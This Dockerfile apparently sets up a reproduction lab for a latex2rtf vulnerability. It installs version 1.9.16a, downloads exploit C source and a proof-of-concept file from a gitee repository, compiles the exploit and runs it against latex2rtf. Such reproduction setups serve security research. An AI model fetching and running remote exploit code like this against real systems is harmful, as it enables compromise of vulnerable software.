FROM liruochen2008/ready_for_exp:v1.2
MAINTAINER "Dongliang Mu" <mudongliangabcd@gmail.com>
RUN apt -y update && apt -y upgrade
RUN apt -y install wget texinfo
WORKDIR /root
RUN wget https://sourceforge.net/projects/latex2rtf/files/latex2rtf-unix/1.9.16a/latex2rtf-1.9.16a.tar.gz; \
mkdir targetsoftware; \
tar -xvf latex2rtf-1.9.16a.tar.gz -C targetsoftware --strip-components 1; \
cd targetsoftware; \
(make || :) && (make install || :) && ((cp /root/targetsoftware/latex2rtf /usr/local/bin/ && (mkdir /usr/local/share/latex2rtf || :) && cp -r /root/targetsoftware/cfg/ /usr/local/share/latex2rtf/cfg/ && cp -r /root/targetsoftware/cfg/ /usr/local/lib/latex2rtf/) || :); 
RUN wget https://gitee.com/liruochen2008/for_download/raw/master/code/latex2rtf.c https://gitee.com/liruochen2008/for_download/raw/master/code/poc.tex; \
gcc -o exploit latex2rtf.c
RUN rm -rf /var/lib/apt/lists
CMD (./exploit > poc.tex) && (latex2rtf poc.tex)
